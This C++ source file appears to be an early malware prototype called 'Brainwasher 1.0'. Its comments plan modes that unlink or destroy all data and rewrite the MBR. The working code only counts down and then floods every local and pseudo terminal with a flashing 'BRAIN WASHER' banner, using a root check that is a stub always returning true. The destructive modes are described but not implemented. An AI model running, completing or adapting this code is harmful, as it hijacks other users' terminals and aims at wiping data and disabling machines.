#include <iostream>
#include <thread>   // Debug
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>

using namespace std;

// !!!UNIX SRC ONLY!!!

// *Delay* is the countdown to data destruction.
// *Mode* is the mode that the program operates in.
// Mode 0: Benign only display to active terminals.
// Mode 1: Active unlink all data.
// Mode 2: Active destroy all data.
// Mode 3: Active destroy all data and rewrite MBR.

int delay = 0;
int mode = 0;
int running = 1000;
vector<string> termlist;

const string RST = "\033[1;0m";
const string RED_BACK = "\033[1;31m";

void hookTerm()
{
    // Access the available tty, pts, and vty stdout.
    // Update active teminal list and directory listing.
    termlist.clear();
    termlist.push_back("/dev/tty1");
    termlist.push_back("/dev/tty2");
    termlist.push_back("/dev/tty3");
    termlist.push_back("/dev/tty4");
    termlist.push_back("/dev/tty5");
    termlist.push_back("/dev/tty6");
    for (const auto & entry : filesystem::directory_iterator("/dev/pts/"))
    {
        if(entry.path() == (filesystem::path)"/dev/pts/ptmx")
        {
            cout << "Debug ptmx is out." << endl;
            continue;
        }
        cout << entry.path().u8string() << endl;
        termlist.push_back(entry.path().u8string());
    }
}

int isRoot()
{
    return 1;
}

void displayloop()
{
    // While running update terminal list and display the brainwasher logo periodically to each.
    int rows = 32;
    int columns = 90;
    string bg = RED_BACK;
    chrono::milliseconds refresh = 200ms;
    while(running)
    {
        if(bg == RED_BACK)
        {
            bg = RST;
        }else
        {
            bg = RED_BACK;
        }
	    hookTerm();
        for(string pts : termlist){
            ofstream out(pts);
            string hash(columns, '#');
            string space((columns/2)-12, ' ');
            for(int i = 0; i < (rows/2); i++)
            {
                out << bg << hash << endl;
            }
            out << space << "BRAIN WASHER" << endl;
            for(int i = 0; i < (rows/2)-1; i++)
            {
                out << bg << hash << endl;
            }
            out.close();
        }
        this_thread::sleep_for(refresh/2);
        running --;
    }
}

int main(int argc, char *argv[])
{
    cout << "Brainwasher 1.0" << endl;
    if(argc != 3)
    {
        cout << "Syntax: bw.exe <delay> <mode>" << endl;
        return 1;
    }
    delay = strtol(argv[1], nullptr, 0);
    mode = strtol(argv[2], nullptr, 0);

    if(isRoot())
    {
        cout << "Mode: " << mode << endl;
        while(delay>0)
        {
            cout << delay << "\r";
            this_thread::sleep_for(1000ms);
            cout << "      " << "\r";
            delay--;
        }
        cout << "Active Terminals: " << endl;
        for(string p : termlist)
        {
            cout << p << endl;
        }
        displayloop();
    }else
    {
        cout << "Brainwashing failed - No root." << endl; 
        return 2;
    }
    return 0;
}
